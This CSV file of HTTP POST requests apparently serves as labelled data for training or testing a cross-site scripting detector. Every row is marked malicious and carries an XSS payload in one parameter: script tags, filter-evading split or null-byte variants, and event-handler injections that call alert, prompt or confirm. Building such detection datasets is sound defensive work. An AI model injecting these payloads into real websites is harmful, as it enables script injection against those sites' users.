method,url,uri,query,headers,body,type
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 50
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""><script>prompt(299792458)</script><""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 47
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>alert(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 53
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>console.log(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>confirm(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 48
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>prompt(299792458)</script>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>alert(299792458)</script><'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 55
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>console.log(299792458)</script><'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 51
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>confirm(299792458)</script><'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 50
Connection: keep-alive
Host: 127.0.0.1:8080",p3='><script>prompt(299792458)</script><'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 46
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRIPT>alert(299792458);</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 52
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRIPT>console.log(299792458);</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 48
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRIPT>confirm(299792458);</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 47
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRIPT>prompt(299792458);</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 63
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<script>pt>alert(299792458);</scr</script>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 69
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<script>pt>console.log(299792458);</scr</script>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 65
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<script>pt>confirm(299792458);</scr</script>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 64
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<script>pt>prompt(299792458);</scr</script>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 63
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRI<script>PT>alert(299792458);</SCR</script>IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 69
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRI<script>PT>console.log(299792458);</SCR</script>IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 65
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRI<script>PT>confirm(299792458);</SCR</script>IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 64
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCRI<script>PT>prompt(299792458);</SCR</script>IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 80
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<scr<script>ipt>pt>alert(299792458);</scr</sc</script>ript>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 86
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<scr<script>ipt>pt>console.log(299792458);</scr</sc</script>ript>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 82
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<scr<script>ipt>pt>confirm(299792458);</scr</sc</script>ript>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 81
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<scri<scr<script>ipt>pt>prompt(299792458);</scr</sc</script>ript>ipt>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 32
Connection: keep-alive
Host: 127.0.0.1:8080","p3="";alert(299792458);""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 38
Connection: keep-alive
Host: 127.0.0.1:8080","p3="";console.log(299792458);""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 34
Connection: keep-alive
Host: 127.0.0.1:8080","p3="";confirm(299792458);""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 33
Connection: keep-alive
Host: 127.0.0.1:8080","p3="";prompt(299792458);""&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 32
Connection: keep-alive
Host: 127.0.0.1:8080",p3=';alert(299792458);'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 38
Connection: keep-alive
Host: 127.0.0.1:8080",p3=';console.log(299792458);'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 34
Connection: keep-alive
Host: 127.0.0.1:8080",p3=';confirm(299792458);'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 33
Connection: keep-alive
Host: 127.0.0.1:8080",p3=';prompt(299792458);'&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 30
Connection: keep-alive
Host: 127.0.0.1:8080",p3=;alert(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 36
Connection: keep-alive
Host: 127.0.0.1:8080",p3=;console.log(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 32
Connection: keep-alive
Host: 127.0.0.1:8080",p3=;confirm(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 31
Connection: keep-alive
Host: 127.0.0.1:8080",p3=;prompt(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 29
Connection: keep-alive
Host: 127.0.0.1:8080",p3=alert(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 35
Connection: keep-alive
Host: 127.0.0.1:8080",p3=console.log(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 31
Connection: keep-alive
Host: 127.0.0.1:8080",p3=confirm(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 30
Connection: keep-alive
Host: 127.0.0.1:8080",p3=prompt(299792458);&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 51
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCR%00IPT>alert(299792458)</SCR%00IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 57
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCR%00IPT>console.log(299792458)</SCR%00IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 53
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCR%00IPT>confirm(299792458)</SCR%00IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 52
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<SCR%00IPT>prompt(299792458)</SCR%00IPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 34
Connection: keep-alive
Host: 127.0.0.1:8080","p3=\"";alert(299792458);//&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 40
Connection: keep-alive
Host: 127.0.0.1:8080","p3=\"";console.log(299792458);//&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 36
Connection: keep-alive
Host: 127.0.0.1:8080","p3=\"";confirm(299792458);//&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 35
Connection: keep-alive
Host: 127.0.0.1:8080","p3=\"";prompt(299792458);//&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 67
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<STYLE TYPE=""text/javascript"">alert(299792458);</STYLE>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 73
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<STYLE TYPE=""text/javascript"">console.log(299792458);</STYLE>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 69
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<STYLE TYPE=""text/javascript"">confirm(299792458);</STYLE>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 68
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<STYLE TYPE=""text/javascript"">prompt(299792458);</STYLE>&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>alert(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 55
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>console.log(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 51
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>confirm(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 50
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>prompt(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 42
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmousemove=alert(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 41
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseout=alert(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 42
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseover=alert(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 48
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmousemove=console.log(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 47
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseout=console.log(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 48
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseover=console.log(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 44
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmousemove=confirm(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 43
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseout=confirm(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 44
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseover=confirm(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 43
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmousemove=prompt(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 42
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseout=prompt(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 43
Connection: keep-alive
Host: 127.0.0.1:8080","p3=""onmouseover=prompt(299792458) &p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 49
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>alert(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 55
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>console.log(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 51
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>confirm(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 50
Connection: keep-alive
Host: 127.0.0.1:8080",p3=<<SCRIPT>prompt(299792458)//<</SCRIPT>&p4=p4val,malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 52
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<img src=""1"" onerror=""alert(299792458)"">&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 58
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<img src=""1"" onerror=""console.log(299792458)"">&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 54
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<img src=""1"" onerror=""confirm(299792458)"">&p4=p4val",malicious
POST,/example,/example,p1=p1val&p2=p2val,"Cookie: c=cval
Content-Length: 53
Connection: keep-alive
Host: 127.0.0.1:8080","p3=<img src=""1"" onerror=""prompt(299792458)"">&p4=p4val",malicious
